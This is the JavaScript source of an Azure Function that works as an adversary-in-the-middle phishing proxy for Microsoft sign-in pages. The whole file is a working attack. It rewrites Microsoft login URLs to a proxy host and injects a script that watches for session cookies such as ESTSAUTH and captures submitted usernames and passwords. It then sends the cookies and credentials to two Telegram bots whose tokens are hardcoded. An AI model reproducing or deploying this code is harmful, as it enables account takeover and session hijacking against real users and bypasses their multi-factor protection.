const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  let path = req.params.path || '';
  
  await sendTelegram(`🍪 <b>COOKIE PROXY ACCESSED</b>\n🔗 URL: ${req.url}\n📅 ${new Date().toISOString()}`);
  
  // Handle special capture endpoints
  if (path === 'hijack-session') {
    try {
      const cookieData = JSON.parse(req.rawBody || '{}');
      
      // Critical Microsoft session cookies
      const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
      const foundCritical = criticalCookies.filter(cookie => cookieData.cookies && cookieData.cookies[cookie]);
      
      if (foundCritical.length > 0) {
        let cookieMessage = '🚨 <b>CRITICAL SESSION COOKIES CAPTURED!</b>\n';
        foundCritical.forEach(cookie => {
          cookieMessage += `🔑 <b>${cookie}:</b> ${cookieData.cookies[cookie]}\n`;
        });
        cookieMessage += `📅 ${new Date().toISOString()}`;
        await sendTelegram(cookieMessage);
      }
      
      context.res = {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'received' })
      };
    } catch (error) {
      context.res = {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Failed to parse cookie data' })
      };
    }
    return;
  }
  
  if (path === 'hijack-credentials') {
    try {
      const credData = JSON.parse(req.rawBody || '{}');
      
      if (credData.username && credData.password) {
        await sendTelegram(`🔐 <b>CREDENTIALS CAPTURED!</b>\n👤 <b>Username:</b> ${credData.username}\n🔑 <b>Password:</b> ${credData.password}\n📅 ${new Date().toISOString()}`);
      }
      
      context.res = {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'received' })
      };
    } catch (error) {
      context.res = {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Failed to parse credential data' })
      };
    }
    return;
  }
  
  // Main proxy logic
  let targetUrl;
  if (!path || path === '') {
    targetUrl = 'https://login.microsoftonline.com/common/';
  } else {
    if (path.includes('login.live.com') || path.includes('account.live.com')) {
      targetUrl = `https://${path}`;
    } else if (path.includes('login.microsoftonline.com')) {
      targetUrl = `https://${path}`;
    } else {
      targetUrl = `https://login.microsoftonline.com/${path}`;
    }
  }
  
  // Add query parameters
  if (req.query && Object.keys(req.query).length > 0) {
    const params = new URLSearchParams();
    Object.entries(req.query).forEach(([key, value]) => {
      params.append(key, value);
    });
    targetUrl += '?' + params.toString();
  }
  
  try {
    // Prepare headers
    const headers = {};
    ['accept', 'accept-language', 'user-agent', 'content-type'].forEach(header => {
      const value = req.headers[header];
      if (value) headers[header] = value;
    });
    
    const proxyRequest = {
      method: req.method,
      headers
    };
    
    // Add body for POST/PUT requests
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      const body = req.rawBody || req.body;
      proxyRequest.body = body;
      
      // Capture credentials from form data
      if (body && headers['content-type'] && headers['content-type'].includes('application/x-www-form-urlencoded')) {
        const params = new URLSearchParams(body);
        const login = params.get('login') || params.get('username') || params.get('email') || params.get('loginfmt');
        const password = params.get('passwd') || params.get('password') || params.get('pwd');
        
        if (login && password) {
          await sendTelegram(`🔐 <b>FORM CREDENTIALS CAPTURED!</b>\n👤 <b>Login:</b> ${login}\n🔑 <b>Password:</b> ${password}\n📅 ${new Date().toISOString()}`);
        }
      }
    }
    
    const response = await fetch(targetUrl, proxyRequest);
    
    await sendTelegram(`✅ <b>MICROSOFT PAGE LOADED</b>\n🔗 Target: ${targetUrl}\n📊 Status: ${response.status}\n📅 ${new Date().toISOString()}`);
    
    // Get the response content
    const contentType = response.headers.get('content-type') || '';
    
    if (contentType.includes('text/html')) {
      let html = await response.text();
      
      // 🎯 URL REWRITING - Replace Microsoft URLs with our proxy
      html = html
        .replace(/https:\/\/login\.microsoftonline\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy/login.microsoftonline.com')
        .replace(/https:\/\/login\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy/login.live.com')
        .replace(/https:\/\/account\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy/account.live.com')
        .replace(/logincdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy/logincdn.msauth.net')
        .replace(/aadcdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy/aadcdn.msauth.net');
      
      // 🔥 INJECT ADVANCED COOKIE MONITORING SCRIPT
      const cookieScript = `
<script>
(function() {
  // Critical Microsoft session cookies to monitor
  const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
  
  // Monitor document.cookie changes
  let lastCookies = document.cookie;
  
  function checkCookies() {
    const currentCookies = document.cookie;
    if (currentCookies !== lastCookies) {
      const cookies = {};
      currentCookies.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name && value) cookies[name] = value;
      });
      
      // Check for critical cookies
      const foundCritical = criticalCookies.filter(c => cookies[c]);
      if (foundCritical.length > 0) {
        fetch('/cookieproxy/hijack-session', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({cookies, timestamp: new Date().toISOString()})
        }).catch(e => console.log('Cookie send failed'));
      }
      
      lastCookies = currentCookies;
    }
  }
  
  // Monitor every 1 second
  setInterval(checkCookies, 1000);
  
  // Monitor form submissions for credentials
  document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    
    const username = formData.get('login') || formData.get('username') || formData.get('email') || formData.get('loginfmt');
    const password = formData.get('passwd') || formData.get('password') || formData.get('pwd');
    
    if (username && password) {
      fetch('/cookieproxy/hijack-credentials', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username, password, timestamp: new Date().toISOString()})
      }).catch(e => console.log('Credential send failed'));
    }
  });
})();
</script>`;
      
      // Inject script before closing head tag
      html = html.replace('</head>', cookieScript + '</head>');
      
      context.res = {
        status: response.status,
        headers: {
          'Content-Type': 'text/html',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization'
        },
        body: html
      };
      
    } else {
      // For non-HTML content, pass through as-is
      const buffer = await response.arrayBuffer();
      context.res = {
        status: response.status,
        headers: {
          'Content-Type': contentType,
          'Access-Control-Allow-Origin': '*'
        },
        body: Buffer.from(buffer)
      };
    }
    
  } catch (error) {
    context.log('Proxy error:', error);
    await sendTelegram(`❌ <b>PROXY ERROR</b>\n🔗 URL: ${targetUrl}\n🔥 Error: ${error.message}\n📅 ${new Date().toISOString()}`);
    
    context.res = {
      status: 503,
      headers: { 'Content-Type': 'text/html' },
      body: `
<!DOCTYPE html>
<html>
<head>
    <title>Service Temporarily Unavailable</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .error { color: #721c24; background: #f8d7da; padding: 15px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🚧 Service Temporarily Unavailable</h2>
        <div class="error">
            <p>We're experiencing technical difficulties. Please try again in a few moments.</p>
            <p><strong>Error:</strong> Unable to connect to Microsoft services</p>
        </div>
        <p><a href="/cookieproxy/">🔄 Try Again</a></p>
    </div>
</body>
</html>
      `
    };
  }
};